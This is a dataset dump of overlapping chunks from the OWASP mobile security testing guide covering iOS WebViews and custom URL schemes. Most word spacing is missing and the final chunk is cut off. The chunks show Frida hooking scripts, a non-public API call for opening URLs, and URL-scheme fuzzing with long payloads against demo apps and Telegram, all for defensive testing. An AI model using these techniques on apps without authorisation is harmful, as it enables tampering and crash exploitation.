GrepforNSExtensionPointIdentifieramongallfilesinsidetheappbundle(IPAorinstalledapp): $grep -nrNSExtensionPointIdentifierPayload/Telegram\\X.app/ BinaryfilePayload/TelegramX.app//PlugIns/SiriIntents.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//PlugIns/Share.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//PlugIns/NotificationContent.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//PlugIns/Widget.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//Watch/Watch.app/PlugIns/WatchExtension.appex/Info.plistmatches YoucanalsoaccessperSSH,findtheappbundleandlistallinsidePlugIns(theyareplacedtherebydefault)ordoitwith objection: 454\\nph.telegra.Telegraphon (iPhone:11.1.2)[usb] #cdPlugIns /var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/ TelegramX.app/PlugIns ph.telegra.Telegraphon (iPhone:11.1.2)[usb] #ls NSFileType Perms NSFileProtection Read Write Name ##TestingiOSWebViews >**Platform:**ios > >**MASVSV1:**MSTG-PLATFORM-5 > >**MASVSV2:**MASVS-PLATFORM-2 ###Overview ###StaticAnalysis Forthestaticanalysiswewillfocusmostlyonthefollowingpointshaving `UIWebView`and`WKWebView`underscope. -IdentifyingWebViewusage -TestingJavaScriptconfiguration -Testingformixedcontent -TestingforWebViewURImanipulation ####IdentifyingWebViewUsage LookoutforusagesoftheabovementionedWebViewclassesbysearchinginXcode. Inthecompiledbinaryyoucansearchinitssymbolsorstringslikethis: #####UIWebView ```bash $rabin2 -zz./WheresMyBrowser |egrep \"UIWebView$\" 4890x0002fee90x10002fee9 9 10 (5.__TEXT.__cstring)asciiUIWebView 8960x0003c8130x0003c813 24 25 ()ascii@_OBJC_CLASS_$_UIWebView 17540x000595990x00059599 23 24 ()ascii_OBJC_CLASS_$_UIWebView WKWebView $rabin2 -zz./WheresMyBrowser |egrep \"WKWebView$\" 4900x0002fef30x10002fef3 9 10 (5.__TEXT.__cstring)asciiWKWebView 6250x000316700x100031670 17 18 (5.__TEXT.__cstring)asciiunwindToWKWebView 9040x0003c9600x0003c960 24 25 ()ascii@_OBJC_CLASS_$_WKWebView 17570x000595e40x000595e4 23 24 ()ascii_OBJC_CLASS_$_WKWebView AlternativelyyoucanalsosearchforknownmethodsoftheseWebViewclasses. Forexample,searchforthemethodused toinitializeaWKWebView(init(frame:configuration:)): $rabin2 -zzq ./WheresMyBrowser |egrep \"WKWebView.*frame\" 0x5c3ac7776__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 152
    }
  },
  {
    "text": "LookoutforusagesoftheabovementionedWebViewclassesbysearchinginXcode. Inthecompiledbinaryyoucansearchinitssymbolsorstringslikethis: #####UIWebView ```bash $rabin2 -zz./WheresMyBrowser |egrep \"UIWebView$\" 4890x0002fee90x10002fee9 9 10 (5.__TEXT.__cstring)asciiUIWebView 8960x0003c8130x0003c813 24 25 ()ascii@_OBJC_CLASS_$_UIWebView 17540x000595990x00059599 23 24 ()ascii_OBJC_CLASS_$_UIWebView WKWebView $rabin2 -zz./WheresMyBrowser |egrep \"WKWebView$\" 4900x0002fef30x10002fef3 9 10 (5.__TEXT.__cstring)asciiWKWebView 6250x000316700x100031670 17 18 (5.__TEXT.__cstring)asciiunwindToWKWebView 9040x0003c9600x0003c960 24 25 ()ascii@_OBJC_CLASS_$_WKWebView 17570x000595e40x000595e4 23 24 ()ascii_OBJC_CLASS_$_WKWebView AlternativelyyoucanalsosearchforknownmethodsoftheseWebViewclasses. Forexample,searchforthemethodused toinitializeaWKWebView(init(frame:configuration:)): $rabin2 -zzq ./WheresMyBrowser |egrep \"WKWebView.*frame\" 0x5c3ac7776__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC 0x5d97a7978__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO 0x6b5d57776__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC 0x6c3fa7978__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO Youcanalsodemangleit: $xcrunswift-demangle__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO --->@nonobjc__C.WKWebView.init(frame:__C_Synthesized.CGRect, configuration:__C.WKWebViewConfiguration)-> __C.WKWebView Testing Custom URL Schemes Platform: ios MASVSV1: MSTG-PLATFORM-3 MASVSV2: MASVS-PLATFORM-1 455\\nOverview Static Analysis Thereareacoupleofthingsthatwecandousingstaticanalysis. Inthenextsectionswewillseethefollowing: • TestingcustomURLschemesregistration • Testingapplicationqueryschemesregistration • TestingURLhandlingandvalidation • TestingURLrequeststootherapps • Testingfordeprecatedmethods Testing Custom URL Schemes Registration ThefirststeptotestcustomURLschemesisfindingoutwhetheranapplicationregistersanyprotocolhandlers. Ifyouhavetheoriginalsourcecodeandwanttoviewregisteredprotocolhandlers,simplyopentheprojectinXcode,go totheInfotabandopentheURLTypessectionaspresentedinthescreenshotbelow: AlsoinXcodeyoucanfindthisbysearchingfortheCFBundleURLTypeskeyintheapp’sInfo.plistfile(examplefrom iGoat-Swift): <key>CFBundleURLTypes</key> <array> <dict> <key>CFBundleURLName</key> <string>com.iGoat.myCompany</string> <key>CFBundleURLSchemes</key> <array> <string>iGoat</string> </array> </dict> </array> Inacompiledapplication(orIPA),registeredprotocolhandlersarefoundinthefileInfo.plistintheappbundle’sroot folder. OpenitandsearchfortheCFBundleURLSchemeskey,ifpresent,itshouldcontainanarrayofstrings(examplefrom iGoat-Swift): grep-A5-nriurlschInfo.plist Info.plist:45: <key>CFBundleURLSchemes</key> Info.plist-46- <array> Info.plist-47- <string>iGoat</string> Info.plist-48- </array> OncetheURLschemeisregistered,otherappscanopentheappthatregisteredthescheme,andpassparametersbycre- atingappropriatelyformattedURLsandopeningthemwiththeUIApplication openURL:options:completionHandler: method. NotefromtheAppProgrammingGuideforiOS: Ifmorethanonethird-partyappregisterstohandlethesameURLscheme,thereiscurrentlynoprocessfordeter- miningwhichappwillbegiventhatscheme. ThiscouldleadtoaURLschemehijackingattack(seepage136in[#thiel2]). 456\\nTesting Application Query Schemes Registration BeforecallingtheopenURL:options:completionHandler: method,appscancallcanOpenURL:toverifythatthetarget appisavailable. However,asthismethodwasbeingusedbymaliciousappasawaytoenumerateinstalledapps,from iOS 9.0 the URL schemes passed to it must be also declared by adding the LSApplicationQueriesSchemes key to the app’sInfo.plistfileandanarrayofupto50URLschemes. <key>LSApplicationQueriesSchemes</key> <array> <string>url_scheme1</string> <string>url_scheme2</string> </array> canOpenURLwillalwaysreturnNOforundeclaredschemes,whetherornotanappropriateappisinstalled. However,this restrictiononlyappliestocanOpenURL. TheopenURL:options:completionHandler: methodwillstillopenanyURLscheme,eveniftheLSApplication- QueriesSchemesarraywasdeclared,andreturnYES/NOdependingontheresult. Asanexample,TelegramdeclaresinitsInfo.plisttheseQueriesSchemes,amongothers: <key>LSApplicationQueriesSchemes</key> <array> <string>dbapi-3</string> <string>instagram</string> <string>googledrive</string> <string>comgooglemaps-x-callback</string> <string>foursquare</string> <string>here-location</string> <string>yandexmaps</string> <string>yandexnavi</string> <string>comgooglemaps</string> <string>youtube</string> <string>twitter</string> ... Testing URL Handling and Validation InordertodeterminehowaURLpathisbuiltandvalidated,ifyouhavetheoriginalsourcecode,youcansearchforthe followingmethods: • application:didFinishLaunchingWithOptions:methodorapplication:will-FinishLaunchingWithOptions:: verifyhowthedecisionismadeandhowtheinformationabouttheURLisretrieved. • application:openURL:options:: verifyhowtheresourceisbeingopened,i.e.howthedataisbeingparsed,verify theoptions,especiallyifaccessbythecallingapp(sourceApplication)shouldbeallowedordenied. Theappmight alsoneeduserpermissionwhenusingthecustomURLscheme. InTelegramyouwillfindfourdifferentmethodsbeingused: funcapplication(_application:UIApplication,openurl:URL,sourceApplication:String?)->Bool{ self.openUrl(url:url) returntrue } funcapplication(_application:UIApplication,openurl:URL,sourceApplication:String?, annotation:Any)->Bool{ self.openUrl(url:url) returntrue } funcapplication(_app:UIApplication,openurl:URL, options:[UIApplicationOpenURLOptionsKey:Any]=[:])->Bool{ self.openUrl(url:url) returntrue } funcapplication(_application:UIApplication,handleOpenurl:URL)->Bool{ self.openUrl(url:url) returntrue } Wecanobservesomethingshere: • Theappimplementsalsodeprecatedmethodslikeapplication:handleOpenURL:andapplication:openURL:sourceApplication:annotation:. • Thesourceapplicationisnotbeingverifiedinanyofthosemethods. • AllofthemcallaprivateopenUrlmethod. YoucaninspectittolearnmoreabouthowtheURLrequestishandled. 457\\nTesting URL Requests to Other Apps The method openURL:options:completionHandler: and the deprecated openURL: method of UIApplication are re- sponsibleforopeningURLs(i.e.tosendrequests/makequeriestootherapps)thatmaybelocaltothecurrentappor itmaybeonethatmustbeprovidedbyadifferentapp. Ifyouhavetheoriginalsourcecodeyoucansearchdirectlyfor usagesofthosemethods. Additionally,ifyouareinterestedintoknowingiftheappisqueryingspecificservicesorapps,andiftheappiswell-known, youcanalsosearchforcommonURLschemesonlineandincludetheminyourgreps. Forexample,aquickGooglesearch reveals: AppleMusic-music://ormusics://oraudio-player-event:// Calendar-calshow://orx-apple-calevent:// Contacts-contacts:// Diagnostics-diagnostics://ordiags:// GarageBand-garageband:// iBooks-ibooks://oritms-books://oritms-bookss:// Mail-message://ormailto://emailaddress Messages-sms://phonenumber Notes-mobilenotes:// ... WesearchforthismethodintheTelegramsourcecode,thistimewithoutusingXcode,justwithegrep: $egrep -nr\"open.*options.*completionHandler\" ./Telegram-iOS/ ./AppDelegate.swift:552:returnUIApplication.shared.open(parsedUrl, options:[UIApplicationOpenURLOptionUniversalLinksOnly:trueasNSNumber], completionHandler:{valuein ./AppDelegate.swift:556:returnUIApplication.shared.open(parsedUrl, options:[UIApplicationOpenURLOptionUniversalLinksOnly:trueasNSNumber], completionHandler:{valuein If we inspect the results we will see that openURL:options:completionHandler: is actually being used for universal links,sowehavetokeepsearching. Forexample,wecansearchforopenURL(: $egrep -nr\"openURL\\(\" ./Telegram-iOS/ ./ApplicationContext.swift:763: UIApplication.shared.openURL(parsedUrl) ./ApplicationContext.swift:792: UIApplication.shared.openURL(URL( string: \"https://telegram.org/deactivate?phone=\\(phone)\")! ) ./AppDelegate.swift:423: UIApplication.shared.openURL(url) ./AppDelegate.swift:538: UIApplication.shared.openURL(parsedUrl) ... If we inspect those lines we will see how this method is also being used to open “Settings” or to open the “App Store Page”. Whenjustsearchingfor://wesee: ifdocumentUri.hasPrefix(\"file://\"),letpath=URL(string:documentUri)?.path{ if!url.hasPrefix(\"mt-encrypted-file://?\"){ guardletdict=TGStringUtils.argumentDictionary(inUrlString:String(url[url.index(url.startIndex, offsetBy:\"mt-encrypted-file://?\".count)...]))else{ parsedUrl=URL(string:\"https://\\(url)\") ifleturl=URL(string:\"itms-apps://itunes.apple.com/app/id\\(appStoreId)\"){ }elseifleturl=urlas?String,url.lowercased().hasPrefix(\"tg://\"){ [[WKExtensionsharedExtension]openSystemURL:[NSURLURLWithString:[NSString stringWithFormat:@\"tel://%@\",userHandle.data]]]; Aftercombiningtheresultsofbothsearchesandcarefullyinspectingthesourcecodewefindthefollowingpieceofcode: openUrl:{urlin varparsedUrl=URL(string:url) ifletparsed=parsedUrl{ ifparsed.scheme==nil||parsed.scheme!.isEmpty{ parsedUrl=URL(string:\"https://\\(url)\") } ifparsed.scheme==\"tg\"{ return } } ifletparsedUrl=parsedUrl{ UIApplication.shared.openURL(parsedUrl) 458\\nBeforeopeningaURL,theschemeisvalidated,“https”willbeaddedifnecessaryanditwon’topenanyURLwiththe“tg” scheme. WhenreadyitwillusethedeprecatedopenURLmethod. Ifonlyhavingthecompiledapplication(IPA)youcanstilltrytoidentifywhichURLschemesarebeingusedtoqueryother apps: • CheckifLSApplicationQueriesSchemeswasdeclaredorsearchforcommonURLschemes. • Alsousethestring://orbuildaregularexpressiontomatchURLsastheappmightnotbedeclaringsomeschemes. Youcandothatbyfirstverifyingthattheappbinarycontainsthosestringsbye.g.usingunixstringscommand: strings <yourapp>|grep \"someURLscheme://\" orevenbetter,useradare2’siz/izzcommandorrafind2,bothwillfindstringswheretheunixstringscommandwon’t. ExamplefromiGoat-Swift: $r2 -qcizz~iGoat://iGoat-Swift 374360x001ee6100x001ee610 23 24 (4.__TEXT.__cstring)asciiiGoat://?contactNumber= Testing for Deprecated Methods Searchfordeprecatedmethodslike: • application:handleOpenURL: • openURL: • application:openURL:sourceApplication:annotation: Forexample,herewefindthosethree: $rabin2 -zzq Telegram\\X.app/Telegram\\X |grep -i\"openurl\" 0x1000d9e903130UIApplicationOpenURLOptionsKey 0x1000dee3f5049application:openURL:sourceApplication:annotation: 0x1000dee712928application:openURL:options: 0x1000dee8e2726application:handleOpenURL: 0x1000df2c998openURL: 0x1000df7661211canOpenURL: 0x1000df7723534openURL:options:completionHandler: ... Dynamic Analysis Onceyou’veidentifiedthecustomURLschemestheapphasregistered,thereareseveralmethodsthatyoucanuseto testthem: • PerformingURLrequests • IdentifyingandhookingtheURLhandlermethod • TestingURLschemessourcevalidation • FuzzingURLschemes Performing URL Requests Using Safari ToquicklytestoneURLschemeyoucanopentheURLsonSafariandobservehowtheappbehaves. Forexample,ifyou write tel://123456789 in the address bar of Safari, a pop up will appear with the telephone number and the options “Cancel”and“Call”. Ifyoupress“Call”itwillopenthePhoneappanddirectlymakethecall. YoumayalsoknowalreadyaboutpagesthattriggercustomURLschemes,youcanjustnavigatenormallytothosepages andSafariwillautomaticallyaskwhenitfindsacustomURLscheme. 459\\nUsing the Notes App As already seen in “Triggering Universal Links”, you may use the Notes app and long press the links you’ve written in ordertotestcustomURLschemes. Remembertoexittheeditingmodeinordertobeabletoopenthem. Notethatyou canclickorlongpresslinksincludingcustomURLschemesonlyiftheappisinstalled,ifnottheywon’tbehighlightedas clickablelinks. Using Frida IfyousimplywanttoopentheURLschemeyoucandoitusingFrida: $frida -UiGoat-Swift [iPhone::iGoat-Swift]->function openURL(url){ varUIApplication =ObjC.classes.UIApplication.sharedApplication(); vartoOpen =ObjC.classes.NSURL.URLWithString_(url); return UIApplication.openURL_(toOpen); } [iPhone::iGoat-Swift]->openURL(\"tel://234234234\") true InthisexamplefromFridaCodeSharetheauthorusesthenon-publicAPILSApplicationWorkspace.openSensitiveURL:withOptions: toopentheURLs(fromtheSpringBoardapp): function openURL(url){ varw=ObjC.classes.LSApplicationWorkspace.defaultWorkspace(); vartoOpen =ObjC.classes.NSURL.URLWithString_(url); return w.openSensitiveURL_withOptions_(toOpen,null); } Notethattheuseofnon-publicAPIsisnotpermittedontheAppStore,that’swhywedon’teventestthesebutwe areallowedtousethemforourdynamicanalysis. Identifying and Hooking",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 153
    }
  },
  {
    "text": "you may use the Notes app and long press the links you’ve written in ordertotestcustomURLschemes. Remembertoexittheeditingmodeinordertobeabletoopenthem. Notethatyou canclickorlongpresslinksincludingcustomURLschemesonlyiftheappisinstalled,ifnottheywon’tbehighlightedas clickablelinks. Using Frida IfyousimplywanttoopentheURLschemeyoucandoitusingFrida: $frida -UiGoat-Swift [iPhone::iGoat-Swift]->function openURL(url){ varUIApplication =ObjC.classes.UIApplication.sharedApplication(); vartoOpen =ObjC.classes.NSURL.URLWithString_(url); return UIApplication.openURL_(toOpen); } [iPhone::iGoat-Swift]->openURL(\"tel://234234234\") true InthisexamplefromFridaCodeSharetheauthorusesthenon-publicAPILSApplicationWorkspace.openSensitiveURL:withOptions: toopentheURLs(fromtheSpringBoardapp): function openURL(url){ varw=ObjC.classes.LSApplicationWorkspace.defaultWorkspace(); vartoOpen =ObjC.classes.NSURL.URLWithString_(url); return w.openSensitiveURL_withOptions_(toOpen,null); } Notethattheuseofnon-publicAPIsisnotpermittedontheAppStore,that’swhywedon’teventestthesebutwe areallowedtousethemforourdynamicanalysis. Identifying and Hooking the URL Handler Method Ifyoucan’tlookintotheoriginalsourcecodeyouwillhavetofindoutyourselfwhichmethoddoestheappusetohandle theURLschemerequeststhatitreceives. YoucannotknowifitisanObjective-CmethodoraSwiftone,orevenifthe appisusingadeprecatedone. Crafting the Link Yourself and Letting Safari Open It ForthiswewillusetheObjCmethodobserverfromFridaCodeShare,whichisanextremelyhandyscriptthatallowsyou toquicklyobserveanycollectionofmethodsorclassesjustbyprovidingasimplepattern. Inthiscaseweareinterestedintoallmethodscontaining“openURL”,thereforeourpatternwillbe*[* *openURL*]: • Thefirstasteriskwillmatchallinstance-andclass+methods. • ThesecondmatchesallObjective-Cclasses. • ThethirdandforthallowtomatchanymethodcontainingthestringopenURL. $frida -UiGoat-Swift --codesharemrmacete/objc-method-observer [iPhone::iGoat-Swift]->observeSomething(\"*[**openURL*]\"); Observing -[_UIDICActivityItemProvideractivityViewController:openURLAnnotationForActivityType:] Observing -[CNQuickActionsManager_openURL:] Observing -[SUClientControlleropenURL:] Observing -[SUClientControlleropenURL:inClientWithIdentifier:] Observing -[FBSSystemServiceopenURL:application:options:clientPort:withResult:] Observing -[iGoat_Swift.AppDelegate application:openURL:options:] Observing -[PrefsUILinkLabelopenURL:] Observing -[UIApplicationopenURL:] Observing -[UIApplication_openURL:] Observing -[UIApplicationopenURL:options:completionHandler:] Observing -[UIApplicationopenURL:withCompletionHandler:] Observing -[UIApplication_openURL:originatingView:completionHandler:] Observing -[SUApplicationapplication:openURL:sourceApplication:annotation:] ... 460\\nThelistisverylongandincludesthemethodswehavealreadymentioned. IfwetriggernowoneURLscheme,forexample “igoat://”fromSafariandaccepttoopenitintheappwewillseethefollowing: [iPhone::iGoat-Swift]->(0x1c4038280) -[iGoat_Swift.AppDelegate application:openURL:options:] application:<UIApplication:0x101d0fad0> openURL:igoat:// options:{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey =\"com.apple.mobilesafari\"; } 0x18b5030d8 UIKit!__58-[UIApplication_applicationOpenURLAction:payload:origin:]_block_invoke 0x18b502a94 UIKit!-[UIApplication_applicationOpenURLAction:payload:origin:] ... 0x1817e1048 libdispatch.dylib!_dispatch_client_callout 0x1817e86c8 libdispatch.dylib!_dispatch_block_invoke_direct$VARIANT$mp 0x18453d9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__ 0x18453d698 FrontBoardServices!-[FBSSerialQueue_performNext] RET:0x1 Nowweknowthat: • Themethod-[iGoat_Swift.AppDelegateapplication:openURL:options:] getscalled. Aswehaveseenbefore, itistherecommendedwayanditisnotdeprecated. • ItreceivesourURLasaparameter: igoat://. • Wealsocanverifythesourceapplication: com.apple.mobilesafari. • We can also know from where it was called, as expected from -[UIApplication _applicationOpenURLAc- tion:payload:origin:]. • Themethodreturns0x1whichmeansYES(thedelegatesuccessfullyhandledtherequest). ThecallwassuccessfulandweseenowthattheiGoatappwasopen: 461\\nNotice that we can also see that the caller (source application) was Safari if we look in the upper-left corner of the screenshot. Dynamically Opening the Link from the App Itself It is also interesting to see which other methods get called on the way. To change the result a little bit we will call the sameURLschemefromtheiGoatappitself. WewilluseagainObjCmethodobserverandtheFridaREPL: $frida -UiGoat-Swift --codesharemrmacete/objc-method-observer [iPhone::iGoat-Swift]->function openURL(url){ varUIApplication =ObjC.classes.UIApplication.sharedApplication(); 462\\nvartoOpen =ObjC.classes.NSURL.URLWithString_(url); return UIApplication.openURL_(toOpen); } [iPhone::iGoat-Swift]->observeSomething(\"*[**openURL*]\"); [iPhone::iGoat-Swift]->openURL(\"iGoat://?contactNumber=123456789&message=hola\") (0x1c409e460) -[__NSXPCInterfaceProxy__LSDOpenProtocolopenURL:options:completionHandler:] openURL:iGoat://?contactNumber=123456789&message=hola options:nil completionHandler:<__NSStackBlock__:0x16fc89c38> 0x183befbec MobileCoreServices!-[LSApplicationWorkspaceopenURL:withOptions:error:] 0x10ba6400c ... RET:nil ... (0x101d0fad0) -[UIApplicationopenURL:] openURL:iGoat://?contactNumber=123456789&message=hola 0x10a610044 ... RET:0x1 true (0x1c4038280) -[iGoat_Swift.AppDelegate application:openURL:options:] application:<UIApplication:0x101d0fad0> openURL:iGoat://?contactNumber=123456789&message=hola options:{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey =\"OWASP.iGoat-Swift\"; } 0x18b5030d8 UIKit!__58-[UIApplication_applicationOpenURLAction:payload:origin:]_block_invoke 0x18b502a94 UIKit!-[UIApplication_applicationOpenURLAction:payload:origin:] ... RET:0x1 The output is truncated for better readability. This time you see that UIApplicationOpenURLOptionsSourceApplica- tionKeyhaschangedtoOWASP.iGoat-Swift,whichmakessense. Inaddition,alonglistofopenURL-likemethodswere called. Considering this information can be very useful for some scenarios as it will help you to decide what you next stepswillbe,e.g.whichmethodyouwillhookortamperwithnext. Opening a Link by Navigating to a Page and Letting Safari Open It You can now test the same situation when clicking on a link contained on a page. Safari will identify and process the URL scheme and choose which action to execute. Opening this link “https://telegram.me/fridadotre” will trigger this behavior. 463\\nFirstofallweletfrida-tracegeneratethestubsforus: $frida-trace -UTelegram -m\"*[**restorationHandler*]\" -i\"*open*Url*\" -m\"*[**application*URL*]\" -m\"*[*openURL]\" ... 7310ms -[UIApplication _applicationOpenURLAction:0x1c44ff900payload:0x10c5ee4c0origin:0x0] 7311ms |-[AppDelegateapplication:0x105a59980openURL:0x1c46ebb80options:0x1c0e222c0] 7312ms |$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14Open URLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF() Nowwecansimplymodifybyhandthestubsweareinterestedin: • TheObjective-Cmethodapplication:openURL:options:: //__handlers__/__AppDelegate_application_openUR_3679fadc.js onEnter:function (log,args,state){ log(\"-[AppDelegateapplication: \" +args[2]+ \"openURL: \" +args[3]+\"options:\" +args[4]+\"]\"); log(\"\\tapplication:\" +ObjC.Object(args[2]).toString()); 464\\nlog(\"\\topenURL:\" +ObjC.Object(args[3]).toString()); log(\"\\toptions:\" +ObjC.Object(args[4]).toString()); }, • TheSwiftmethod$S10TelegramUI15openExternalUrl...: //__handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js onEnter:function (log,args,state){ log(\"TelegramUI.openExternalUrl(account,url, presentationData,\" + \"applicationContext,navigationController, dismissInput)\"); log(\"\\taccount:\" +ObjC.Object(args[1]).toString()); log(\"\\turl:\" +ObjC.Object(args[2]).toString()); log(\"\\tpresentationData:\" +args[3]); log(\"\\tapplicationContext:\" +ObjC.Object(args[4]).toString()); log(\"\\tnavigationController:\" +ObjC.Object(args[5]).toString()); }, Thenexttimewerunit,weseethefollowingoutput: $frida-trace -UTelegram -m\"*[**restorationHandler*]\" -i\"*open*Url*\" -m\"*[**application*URL*]\" -m\"*[*openURL]\" 8144 ms -[UIApplication_applicationOpenURLAction:0x1c44ff900 payload:0x10c5ee4c0 origin:0x0] 8145 ms |-[AppDelegateapplication:0x105a59980 openURL:0x1c46ebb80 options:0x1c0e222c0] 8145 ms | application:<Application:0x105a59980> 8145 ms | openURL:tg://resolve?domain=fridadotre 8145 ms | options :{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey =\"com.apple.mobilesafari\"; } 8269 ms | |TelegramUI.openExternalUrl(account,url,presentationData, applicationContext,navigationController,dismissInput) 8269 ms | | account:nil 8269 ms | | url:tg://resolve?domain=fridadotre 8269 ms | | presentationData:0x1c4c51741 8269 ms | | applicationContext:nil 8269 ms | | navigationController:TelegramUI.PresentationData 8274 ms |-[UIApplicationapplicationOpenURL:0x1c46ebb80] Thereyoucanobservethefollowing: • Itcallsapplication:openURL:options: fromtheappdelegateasexpected. • ThesourceapplicationisSafari(“com.apple.mobilesafari”). • application:openURL:options: handlestheURLbutdoesnotopenit,itcallsTelegramUI.openExternalUrlfor that. •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 154
    }
  },
  {
    "text": ":{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey =\"com.apple.mobilesafari\"; } 8269 ms | |TelegramUI.openExternalUrl(account,url,presentationData, applicationContext,navigationController,dismissInput) 8269 ms | | account:nil 8269 ms | | url:tg://resolve?domain=fridadotre 8269 ms | | presentationData:0x1c4c51741 8269 ms | | applicationContext:nil 8269 ms | | navigationController:TelegramUI.PresentationData 8274 ms |-[UIApplicationapplicationOpenURL:0x1c46ebb80] Thereyoucanobservethefollowing: • Itcallsapplication:openURL:options: fromtheappdelegateasexpected. • ThesourceapplicationisSafari(“com.apple.mobilesafari”). • application:openURL:options: handlestheURLbutdoesnotopenit,itcallsTelegramUI.openExternalUrlfor that. • TheURLbeingopenedistg://resolve?domain=fridadotre. • Itusesthetg://customURLschemefromTelegram. Itisinterestingtoseethatifyounavigateagainto“https://telegram.me/fridadotre”,clickoncancelandthenclickon thelinkofferedbythepageitself(“OpenintheTelegramapp”),insteadofopeningviacustomURLschemeitwillopen viauniversallinks. 465\\nYoucantrythiswhiletracingbothmethods: $frida-trace -UTelegram -m\"*[**restorationHandler*]\" -m\"*[**application*openURL*options*]\" //Afterclicking\"Open\"onthepop-up 16374 ms -[AppDelegateapplication :0x10556b3c0 openURL :0x1c4ae0080 options :0x1c7a28400] 16374 ms application :<Application:0x10556b3c0> 16374 ms openURL :tg://resolve?domain=fridadotre 16374 ms options :{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey =\"com.apple.mobilesafari\"; } //Afterclicking\"Cancel\"onthepop-upand\"OPEN\"inthepage 406575 ms -[AppDelegateapplication:0x10556b3c0 continueUserActivity:0x1c063d0c0 restorationHandler:0x16f27a898] 406575 ms application:<Application:0x10556b3c0> 406575 ms continueUserActivity:<NSUserActivity:0x1c063d0c0> 406575 ms webpageURL:https://telegram.me/fridadotre 406575 ms activityType:NSUserActivityTypeBrowsingWeb 406575 ms userInfo:{ } 406575 ms restorationHandler:<__NSStackBlock__:0x16f27a898> 466\\nTesting for Deprecated Methods Searchfordeprecatedmethodslike: • application:handleOpenURL: • openURL: • application:openURL:sourceApplication:annotation: Youmaysimplyusefrida-traceforthis,toseeifanyofthosemethodsarebeingused. Testing URL Schemes Source Validation A way to discard or confirm validation could be by hooking typical methods that might be used for that. For example isEqualToString:: //-(BOOL)isEqualToString:(NSString*)aString; varisEqualToString =ObjC.classes.NSString[\"-isEqualToString:\"]; Interceptor.attach(isEqualToString.implementation,{ onEnter:function(args){ varmessage =ObjC.Object(args[2]); console.log(message) } }); IfweapplythishookandcalltheURLschemeagain: $frida -UiGoat-Swift [iPhone::iGoat-Swift]->varisEqualToString =ObjC.classes.NSString[\"-isEqualToString:\"]; Interceptor.attach(isEqualToString.implementation,{ onEnter:function(args){ varmessage =ObjC.Object(args[2]); console.log(message) } }); {} [iPhone::iGoat-Swift]->openURL(\"iGoat://?contactNumber=123456789&message=hola\") true nil Nothinghappens. Thistellsusalreadythatthismethodis notbeingusedfor thataswecannot findanyapp-package- lookingstringlikeOWASP.iGoat-Swiftorcom.apple.mobilesafaribetweenthehookandthetextofthetweet. However, considerthatwearejustprobingonemethod,theappmightbeusingotherapproachforthecomparison. Fuzzing URL Schemes IftheappparsespartsoftheURL,youcanalsoperforminputfuzzingtodetectmemorycorruptionbugs. Whatwehavelearnedabovecanbenowusedtobuildyourownfuzzeronthelanguageofyourchoice, e.g.inPython andcalltheopenURLusingFrida’sRPC.Thatfuzzershoulddothefollowing: • Generatepayloads. • ForeachofthemcallopenURL. • Checkiftheappgeneratesacrashreport(.ips)in/private/var/mobile/Library/Logs/CrashReporter. TheFuzzDBprojectoffersfuzzingdictionariesthatyoucanuseaspayloads. 467\\nUsing Frida Doing this with Frida is pretty easy, as explained in this blog post to see an example that fuzzes the iGoat-Swift app (workingoniOS11.1.2). BeforerunningthefuzzerweneedtheURLschemesasinputs. FromthestaticanalysisweknowthattheiGoat-Swiftapp supportsthefollowingURLschemeandparameters: iGoat://?contactNumber={0}&message={0}. $frida -USpringBoard -lios-url-scheme-fuzzing.js [iPhone::SpringBoard]->fuzz(\"iGoat\",\"iGoat://?contactNumber={0}&message={0}\") WatchingforcrashesfromiGoat... Nologsweremoved. OpenedURL:iGoat://?contactNumber=0&message=0 OK! OpenedURL:iGoat://?contactNumber=1&message=1 OK! OpenedURL:iGoat://?contactNumber=-1&message=-1 OK! OpenedURL:iGoat://?contactNumber=null&message=null OK! OpenedURL:iGoat://?contactNumber=nil&message=nil OK! OpenedURL:iGoat://?contactNumber=99999999999999999999999999999999999 &message=99999999999999999999999999999999999 OK! OpenedURL:iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 